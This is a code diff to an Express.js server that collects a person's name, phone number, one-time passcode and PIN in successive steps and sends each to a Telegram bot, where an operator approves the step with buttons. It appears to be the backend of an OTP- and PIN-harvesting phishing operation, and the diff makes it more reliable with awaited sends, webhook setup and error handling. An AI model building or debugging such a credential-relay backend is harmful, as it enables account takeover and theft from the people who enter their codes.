@@ -5,7 +5,9 @@ const { v4: uuidv4 } = require('uuid');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const DOMAIN = process.env.BACKEND_DOMAIN;
+
+// Sanitize domain: remove trailing slashes
+const DOMAIN = (process.env.BACKEND_DOMAIN || '').replace(/\/+$/, '');
 
 // ---------- IN-MEMORY STORES ----------
 const phoneRequests = {};
@@ -66,11 +68,20 @@ async function setWebhook(bot) {
     console.warn('⚠️ BACKEND_DOMAIN missing – webhook not set');
     return false;
   }
+
   const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
+
   try {
     const resp = await axios.get(
-      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
+      `https://api.telegram.org/bot${bot.token}/setWebhook`,
+      {
+        params: {
+          url,
+          allowed_updates: ['message', 'callback_query']
+        }
+      }
     );
+
     if (resp.data.ok) {
       console.log(`✅ Webhook set for ${bot.botId} -> ${url}`);
       return true;
@@ -114,7 +125,7 @@ async function pingSelf() {
 }
 
 // ---------- PHONE STEP ----------
-app.post('/submit-phone', (req, res) => {
+app.post('/submit-phone', async (req, res) => {
   try {
     const { name, phone, botId } = req.body;
     const bot = getBot(botId);
@@ -126,7 +137,7 @@ app.post('/submit-phone', (req, res) => {
     requestTimestamps[requestId] = Date.now();
     processedTimestamps[requestId] = null;
 
-    sendTelegram(
+    await sendTelegram(
       bot,
       `📱 PHONE VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🆔 Ref: ${requestId}`,
       [
@@ -138,7 +149,8 @@ app.post('/submit-phone', (req, res) => {
     );
 
     res.json({ requestId });
-  } catch {
+  } catch (err) {
+    console.error('submit-phone error:', err);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
@@ -151,7 +163,7 @@ app.get('/check-phone/:id', (req, res) => {
 });
 
 // ---------- OTP STEP ----------
-app.post('/submit-otp', (req, res) => {
+app.post('/submit-otp', async (req, res) => {
   try {
     const { name, phone, otp, botId } = req.body;
     const bot = getBot(botId);
@@ -163,7 +175,7 @@ app.post('/submit-otp', (req, res) => {
     requestTimestamps[requestId] = Date.now();
     processedTimestamps[requestId] = null;
 
-    sendTelegram(
+    await sendTelegram(
       bot,
       `🔐 OTP VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 OTP: ${otp}\n🆔 Ref: ${requestId}`,
       [
@@ -178,7 +190,8 @@ app.post('/submit-otp', (req, res) => {
     );
 
     res.json({ requestId });
-  } catch {
+  } catch (err) {
+    console.error('submit-otp error:', err);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
@@ -188,7 +201,7 @@ app.get('/check-otp/:id', (req, res) => {
 });
 
 // ---------- PIN STEP ----------
-app.post('/submit-pin', (req, res) => {
+app.post('/submit-pin', async (req, res) => {
   try {
     const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
@@ -200,7 +213,7 @@ app.post('/submit-pin', (req, res) => {
     requestTimestamps[requestId] = Date.now();
     processedTimestamps[requestId] = null;
 
-    sendTelegram(
+    await sendTelegram(
       bot,
       `🔐 PIN VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n🆔 Ref: ${requestId}`,
       [
@@ -212,7 +225,8 @@ app.post('/submit-pin', (req, res) => {
     );
 
     res.json({ requestId });
-  } catch {
+  } catch (err) {
+    console.error('submit-pin error:', err);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
@@ -223,6 +237,9 @@ app.get('/check-pin/:id', (req, res) => {
 
 // ---------- TELEGRAM CALLBACK WEBHOOK ----------
 app.post('/telegram-webhook/:botId', async (req, res) => {
+  console.log('🔥 WEBHOOK HIT:', req.params.botId);
+  console.log('BODY:', JSON.stringify(req.body, null, 2));
+
   try {
     const bot = getBot(req.params.botId);
     if (!bot) {
@@ -337,6 +354,21 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
   } catch (err) {
     console.error('🔥 Webhook handler crashed:', err.message);
+
+    // Try to answer the callback even if the handler crashed
+    try {
+      const cb = req.body?.callback_query;
+      if (cb) {
+        const bot = getBot(req.params.botId);
+        if (bot) {
+          await answerCallback(bot, cb.id, {
+            text: 'Server error. Please try again.',
+            show_alert: true
+          });
+        }
+      }
+    } catch {}
+
     res.sendStatus(200);
   }
 });
@@ -383,10 +415,13 @@ setInterval(async () => {
     console.warn('⚠️ Domain is not HTTPS – Telegram may reject webhooks!');
   }
 
-  await setAllWebhooks();
-
-  app.listen(PORT, () => {
+  app.listen(PORT, async () => {
     console.log(`🚀 Server running on port ${PORT}`);
+
+    // Set webhooks after the server is listening
+    await setAllWebhooks();
+
+    // Log webhook info after a short delay
     setTimeout(async () => {
       for (const bot of bots) {
         try {
